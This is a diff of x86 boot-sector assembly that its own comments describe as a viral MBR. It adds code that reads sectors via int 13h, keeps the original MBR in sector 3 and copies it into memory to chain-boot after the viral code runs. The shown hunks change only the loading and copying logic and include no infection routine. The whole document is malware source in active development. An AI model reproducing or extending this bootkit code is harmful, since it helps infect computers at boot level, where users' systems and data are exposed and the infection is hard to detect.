@@ -85,15 +85,19 @@ load_vx_paint:
 	mov es, ax
 	mov ds, ax
 
-;	mov cx, 0x2
-;	push cx
+	;mov cx, 2400
+	mov cx, 0x2a00
+	push cx
+
 	
 	xor di, di
 	xor si, si
+
+
 	read_sector:
 		mov ax, 0x215	;read twenty one sectors of disk
 		mov ch, 0
-		mov cl, 4		;cylinder 0, sector 3 
+		mov cl, 4		;cylinder 0, sector 4 
 		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
 ;		mov dl, [DefaultDisk]
 		mov bx, 0x200
@@ -101,7 +105,8 @@ load_vx_paint:
 		
 		;inc cl
 		;mov byte [sector_count], cl
-		mov cx, 2400
+		pop cx
+		;mov cx, 2400
 ;		call loop
 
 ;	loop:
@@ -114,11 +119,8 @@ load_vx_paint:
 ;		jnz loop
 ;;		repnz
 ;;		ret
-	
-;	push cs						;copy the code here (the viral MBR) 
-;	pop es						;to address 0000:0x600
-;	mov di, 0x600				;this is typical MBR behavior
-;	mov bx, VX_BOOT ;ax=VXBOOT
+
+
 ;	call loop
 ;	jmp idontplaytagb
 	
@@ -130,20 +132,37 @@ load_vx_paint:
 		dec cx
 		cmp cx, 0
 		jnz loop
-;		ret
-	;mov ax, 0x201	;read one sectors of disk
-	;mov ch, 0		;retrieve OG MBR
-	;mov cl, 3		;cylinder 0, sector 3 
-	;mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
-	;mov bx, 0x200
-	;int 13h
+	cmp byte [copy_replay], 0x0
+;	jnz load_OG_mbr
+;	jmp idontplaytagb
+	jz idontplaytagb
+
+;copy_vx_MBR:	
+;	push cs						;copy the code here (the viral MBR) 
+;	pop es						;to address 0000:0x600
+;	mov di, 0x600				;this is typical MBR behavior
+;	mov bx, VX_BOOT ;ax=VXBOOT
+;	mov cx, 0x100
+;	jmp loop	
+
+load_OG_mbr:
+	mov ax, 0x201	;read one sectors of disk
+	mov ch, 0		;retrieve OG MBR
+	mov cl, 3		;cylinder 0, sector 3 
+;;	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
+	mov bx, 0x200
+	int 13h
 	
 	;copy original MBR to this address 0000:0x7c00
 	;
-	;push cs						;copy the code here (the viral MBR) 
-	;pop es						;to address 0000:0x600
+	push cs						;copy the code here (the viral MBR) 
+	pop es						;to address 0000:0x600
 	;mov di, 0x7C00				;this is typical MBR behavior
-	;jmp loop	
+	mov di, 0x7e00				;this is typical MBR behavior
+	xor si, si
+	mov byte [copy_replay], 0x0
+	mov cx, 0x200
+	jmp loop	
 
 idontplaytagb:	
 	;call boot2nd:0 
@@ -163,6 +182,10 @@ DefaultDisk:
 boot2nd equ 0x900
 cryptlen equ $-crypt
 
+
+copy_replay:
+	db 0x1
+
 partition_start:	
 	times 0x1BE-($-$$) db 0
 
@@ -173,7 +196,6 @@ db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 
 VXend:
-;	times 510-($-$$) db 0
 	db 0x55
 	db 0xAA
 
